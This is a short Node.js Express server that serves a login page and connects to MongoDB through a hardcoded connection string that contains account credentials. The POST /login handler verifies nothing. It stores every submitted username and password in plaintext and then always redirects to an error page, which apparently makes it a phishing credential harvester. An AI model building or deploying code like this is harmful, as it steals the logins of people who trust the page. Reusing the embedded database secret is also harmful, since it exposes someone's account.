const express = require('express');
const app = express();
const path = require('path');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));

// MongoDB connection
mongoose.connect('mongodb+srv://vijaychaudhary1400:Rudra17xyz@cluster0.rbh1mex.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0', { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('MongoDB connected'))
  .catch((err) => console.log('MongoDB connection error:', err));

// User schema and model
const userSchema = new mongoose.Schema({
  username: String,
  password: String
});
const User = mongoose.model('User', userSchema);

app.get('/', (req, res) => {
    res.render('login');
});

// POST /login route to save user data
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    const newUser = new User({ username, password });
    try {
        await newUser.save();
        res.redirect('/error');
    } catch (err) {
        res.redirect('/error');
    }
});

app.get('/success', (req, res) => {
    res.render('success');
});

app.get('/error', (req, res) => {
    res.render('error');
});

app.listen(3000, () => {
    console.log('Server started on http://localhost:3000');
}); 